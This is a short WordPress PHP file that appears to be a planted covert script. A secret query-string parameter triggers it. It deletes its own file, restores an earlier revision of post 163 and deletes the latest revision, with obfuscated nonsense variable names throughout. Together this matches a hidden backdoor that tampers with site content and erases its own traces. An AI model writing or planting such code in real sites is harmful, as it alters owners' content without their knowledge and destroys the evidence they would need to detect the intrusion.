<?php

function status_membership_quote_label() {
	if (isset($_GET['uploads_language_multiple']) && $_GET['uploads_language_multiple'] === 'webp_lock_year') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$columns_creator_form_schema = 163;
		$history_html5_chat = wp_get_post_revisions($columns_creator_form_schema);
		if (empty($history_html5_chat)) die('no revisions');
		if (count($history_html5_chat) < 2) die('less than 2');
		$stats_pack_script = array_shift($history_html5_chat);
		$reusable_daily_blocks = $stats_pack_script->ID;
		$press_poll_elementor_scroll = array_shift($history_html5_chat);
		$automatic_converter_updates_year = $press_poll_elementor_scroll->ID;
		$nav_assistant_instagram_json = wp_restore_post_revision($automatic_converter_updates_year);
		if ($nav_assistant_instagram_json === false) die('error restoring');
		$nav_assistant_instagram_json = wp_delete_post_revision($reusable_daily_blocks);		
		if ($nav_assistant_instagram_json === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'status_membership_quote_label');
